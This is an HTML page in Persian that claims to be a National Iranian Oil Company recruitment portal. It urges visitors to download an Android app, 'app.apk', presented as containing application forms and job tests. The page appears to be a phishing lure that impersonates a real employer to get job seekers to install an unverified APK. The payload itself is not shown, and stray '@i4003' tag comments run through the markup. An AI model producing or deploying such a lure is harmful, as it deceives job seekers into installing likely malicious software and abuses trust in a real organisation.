<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شرکت ملی نفت ایران - استخدام</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f5f5f5;
            color: #333;
        }
        
        .header {
            background-color: #004d40;
            color: white;
            padding: 1.5rem;
            display: flex;
            align-items: center;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .header-logo {
            width: 100px;
            height: 60px;
            margin-left: 20px;
        }
        
        .header-title {
            flex: 1;
            text-align: center;
            font-size: 1.8rem;
        }
        
        .container {
            max-width: 800px;
            margin: 3rem auto;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
            padding: 3rem;
            text-align: center;
        }
        
        .oil-rig-icon {
            font-size: 4rem;
            color: #004d40;
            margin-bottom: 1.5rem;
        }
        
        h1 {
            color: #004d40;
            margin-bottom: 1.5rem;
            font-size: 1.8rem;
        }
        
        p {
            margin-bottom: 2rem;
            font-size: 1.1rem;
            line-height: 1.6;
        }
        
        .download-btn {
            background-color: #004d40;
            color: white;
            border: none;
            padding: 1rem 2rem;
            font-size: 1.2rem;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-block;
            margin-top: 1rem;
            text-decoration: none;
        }
        /* @i4003 */
        .download-btn:hover {
            background-color: #00796b;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }
        
        .footer {
            background-color: #004d40;
            color: white;
            text-align: center;
            padding: 1.5rem;
            margin-top: 3rem;
            font-size: 0.9rem;
        }
        
        @media (max-width: 768px) {
            .header {
                flex-direction: column;
                padding: 1rem;
            }
            
            .header-logo {
                margin: 0 0 1rem 0;
            }
            
            .container {
                margin: 1.5rem;
                padding: 2rem;
            }
            
            h1 {
                font-size: 1.5rem;
            }
        }
    </style>
    
</head>

<body>
    <div class="header">
        <!-- /* @i4003 */ -->
        <!-- شما باید مسیر تصویر لوگوی خود را در اینجا قرار دهید -->
        <img class="header-logo" src="Mn.png" alt="لوگوی شرکت ملی نفت ایران">
        <div class="header-title">شرکت ملی نفت ایران</div>
         <!-- /* @i4003 */ -->
    </div>
    
    <div class="container">
        <div class="oil-rig-icon"></div>
        <h1>فرآیند استخدام در شرکت ملی نفت ایران</h1>
        <p>برای بخش استخدام نرم‌افزار زیر را دانلود فرمایید:</p>
        <p>نرم‌افزار مورد نیاز شامل فرم‌های استخدام، راهنمای تکمیل فرم‌ها و تست‌های تخصصی مربوط به موقعیت‌های شغلی موجود می‌باشد.</p>
        
        <a href="app.apk" class="download-btn" onclick="startDownload()">دانلود نرم‌افزار</a>
    </div>
    
    <div class="footer">
        <p>تمامی حقوق محفوظ است © ۱۴۰۳ شرکت ملی نفت ایران</p>
    </div>
 <!-- /* @i4003 */ -->
   <!-- /* @i4003 */ -->
     <!-- /* @i4003 */ -->
   
</body>
</html>
